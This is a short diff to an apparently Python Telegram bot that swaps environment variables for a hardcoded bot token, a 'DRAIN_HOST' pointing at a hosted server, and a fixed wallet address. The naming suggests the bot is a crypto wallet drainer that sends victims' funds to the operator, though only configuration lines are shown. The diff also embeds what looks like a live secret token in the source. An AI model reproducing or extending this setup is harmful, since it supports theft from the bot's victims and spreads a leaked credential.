@@ -4,8 +4,8 @@ from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.constants import ParseMode
 from telegram.ext import Application, CommandHandler, ContextTypes, Defaults, MessageHandler, filters
 
-BOT_TOKEN = os.environ["BOT_TOKEN"]
-DRAIN_HOST = os.environ["DRAIN_HOST"]        # e.g. drain.example.com  (HTTPS, required)
+BOT_TOKEN = "8904618383:AAGyFr1bv96_ieNBe0s25xOZYZc2j8OtaOw"
+DRAIN_HOST = "geejed.onrender.com"
 MY_WALLET = "AfmpM8nAeh6UEYDkoM9eiQ8wBBfoWYzghRSxLwnyPjpE"
 LAST: dict[int, float] = {}
 
